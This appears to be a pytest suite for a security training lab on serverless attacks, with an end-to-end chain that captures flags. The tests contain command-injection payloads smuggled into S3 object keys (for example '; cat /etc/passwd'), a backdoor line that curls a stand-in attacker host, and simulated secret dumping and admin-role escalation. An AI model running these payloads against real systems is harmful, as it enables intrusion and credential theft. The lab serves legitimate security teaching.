"""
Test suite for Lab 42: ServerlessGuard — Serverless Security & Cloud Event Injection Lab.
"""

import sys
import importlib.util
from pathlib import Path
import pytest
from fastapi.testclient import TestClient

APP_PATH = Path(__file__).resolve().parent.parent / "app" / "main.py"
spec = importlib.util.spec_from_file_location("lab42_app", str(APP_PATH))
lab42_module = importlib.util.module_from_spec(spec)
sys.modules["lab42_app"] = lab42_module
spec.loader.exec_module(lab42_module)

app = lab42_module.app
STAGE1_FLAG = lab42_module.STAGE1_FLAG
STAGE2_FLAG = lab42_module.STAGE2_FLAG
STAGE3_FLAG = lab42_module.STAGE3_FLAG
STAGE4_FLAG = lab42_module.STAGE4_FLAG

client = TestClient(app)


@pytest.fixture(autouse=True)
def reset_state():
    """Ensure clean state before each test."""
    client.post("/api/reset")
    yield
    client.post("/api/reset")


def test_index_dashboard():
    response = client.get("/")
    assert response.status_code == 200
    assert "Lab 42: ServerlessGuard" in response.text
    assert "Port: 8042" in response.text


def test_initial_status():
    response = client.get("/api/status")
    assert response.status_code == 200
    data = response.json()
    assert data["lab"] == "42"
    assert data["all_stages_completed"] is False
    assert data["stages"]["stage1_event_injection"] is False
    assert data["stages"]["stage2_warm_container_tmp"] is False
    assert data["stages"]["stage3_iam_privilege_escalation"] is False
    assert data["stages"]["stage4_runtime_hardening"] is False
    assert data["container_metrics"]["state"] == "WARM"


def test_stage1_normal_event_processing():
    response = client.post(
        "/api/stage1/invoke-event",
        json={
            "Records": [
                {
                    "eventSource": "aws:s3",
                    "eventName": "ObjectCreated:Put",
                    "s3": {
                        "bucket": {"name": "corp-invoice-intake"},
                        "object": {"key": "safe_invoice_2026.pdf"}
                    }
                }
            ]
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert "Safe key" in data["message"]
    assert "flag" not in data


def test_stage1_missing_records():
    response = client.post(
        "/api/stage1/invoke-event",
        json={"Records": []}
    )
    assert response.status_code == 400


def test_stage1_event_injection_exploit():
    payloads = [
        "invoice_001.pdf; cat /etc/passwd",
        "invoice_002.pdf | id",
        "invoice_003.pdf && whoami",
        "invoice_004.pdf; env"
    ]
    for key in payloads:
        client.post("/api/reset")
        response = client.post(
            "/api/stage1/invoke-event",
            json={
                "Records": [
                    {
                        "eventSource": "aws:s3",
                        "eventName": "ObjectCreated:Put",
                        "s3": {
                            "bucket": {"name": "corp-invoice-intake"},
                            "object": {"key": key}
                        }
                    }
                ]
            }
        )
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert data["flag"] == STAGE1_FLAG
        assert "Executed injected command" in data["simulated_output"]


def test_stage2_inspect_tmp():
    response = client.get("/api/stage2/inspect-tmp")
    assert response.status_code == 200
    data = response.json()
    assert data["container_execution_mode"] == "WARM"
    files = [f["path"] for f in data["tmp_files"]]
    assert "/tmp/session_cache.json" in files


def test_stage2_invalid_action():
    response = client.post(
        "/api/stage2/dump-secrets",
        json={"action": "unknown_action"}
    )
    assert response.status_code == 400


def test_stage2_write_payload_and_dump_secrets():
    # Test writing custom backdoor payload to /tmp
    write_res = client.post(
        "/api/stage2/dump-secrets",
        json={
            "action": "write_payload",
            "filename": "/tmp/backdoor.py",
            "content": "import os; os.system('curl attacker.site')"
        }
    )
    assert write_res.status_code == 200
    assert "Backdoor payload written" in write_res.json()["message"]

    # Dump secrets to get flag
    dump_res = client.post(
        "/api/stage2/dump-secrets",
        json={"action": "dump_secrets"}
    )
    assert dump_res.status_code == 200
    data = dump_res.json()
    assert data["success"] is True
    assert data["flag"] == STAGE2_FLAG
    assert data["leaked_credentials"]["aws_access_key_id"] == "ASIA2XSERVERLESS9988"


def test_stage3_get_iam_policy():
    response = client.get("/api/stage3/iam-policy")
    assert response.status_code == 200
    data = response.json()
    assert "role" in data
    assert "ServerlessEventProcessorRole" in data["role"]["RoleName"]
    assert len(data["findings"]) >= 2


def test_stage3_invalid_assume_role_target():
    response = client.post(
        "/api/stage3/escalate-iam",
        json={"target_role_arn": "arn:aws:iam::123456789012:role/NonExistentRole"}
    )
    assert response.status_code == 400
    assert "cannot be assumed" in response.json()["detail"]


def test_stage3_successful_assume_role():
    response = client.post(
        "/api/stage3/escalate-iam",
        json={"target_role_arn": "arn:aws:iam::123456789012:role/CorpCloudAdminRole"}
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert data["flag"] == STAGE3_FLAG
    assert data["assumed_role_result"]["Credentials"]["AccessKeyId"] == "ASIA99ADMINESCALATED123"


def test_stage4_incomplete_hardening():
    # Missing readonly_root_fs
    res1 = client.post(
        "/api/stage4/harden-runtime",
        json={
            "readonly_root_fs": False,
            "clean_tmp_per_invocation": True,
            "event_schema_validation": True,
            "iam_least_privilege": True
        }
    )
    assert res1.status_code == 400
    assert "readonly_root_fs" in res1.json()["detail"]

    # Missing iam_least_privilege
    res2 = client.post(
        "/api/stage4/harden-runtime",
        json={
            "readonly_root_fs": True,
            "clean_tmp_per_invocation": True,
            "event_schema_validation": True,
            "iam_least_privilege": False
        }
    )
    assert res2.status_code == 400
    assert "iam_least_privilege" in res2.json()["detail"]


def test_stage4_full_hardening_success():
    response = client.post(
        "/api/stage4/harden-runtime",
        json={
            "readonly_root_fs": True,
            "clean_tmp_per_invocation": True,
            "event_schema_validation": True,
            "iam_least_privilege": True
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert data["flag"] == STAGE4_FLAG
    assert data["runtime_controls"]["readonly_root_fs"] is True
    assert data["applied_policies"][0]["PolicyName"] == "StrictLeastPrivilegeInvoiceReader"


def test_end_to_end_full_solver_chain():
    # 1. Stage 1
    r1 = client.post(
        "/api/stage1/invoke-event",
        json={
            "Records": [
                {
                    "eventSource": "aws:s3",
                    "eventName": "ObjectCreated:Put",
                    "s3": {
                        "bucket": {"name": "corp-invoice-intake"},
                        "object": {"key": "invoice_poc.pdf; id"}
                    }
                }
            ]
        }
    )
    assert r1.json()["flag"] == STAGE1_FLAG

    # 2. Stage 2
    r2 = client.post("/api/stage2/dump-secrets", json={"action": "dump_secrets"})
    assert r2.json()["flag"] == STAGE2_FLAG

    # 3. Stage 3
    r3 = client.post(
        "/api/stage3/escalate-iam",
        json={"target_role_arn": "arn:aws:iam::123456789012:role/CorpCloudAdminRole"}
    )
    assert r3.json()["flag"] == STAGE3_FLAG

    # 4. Stage 4
    r4 = client.post(
        "/api/stage4/harden-runtime",
        json={
            "readonly_root_fs": True,
            "clean_tmp_per_invocation": True,
            "event_schema_validation": True,
            "iam_least_privilege": True
        }
    )
    assert r4.json()["flag"] == STAGE4_FLAG

    # Final status check
    status = client.get("/api/status").json()
    assert status["all_stages_completed"] is True
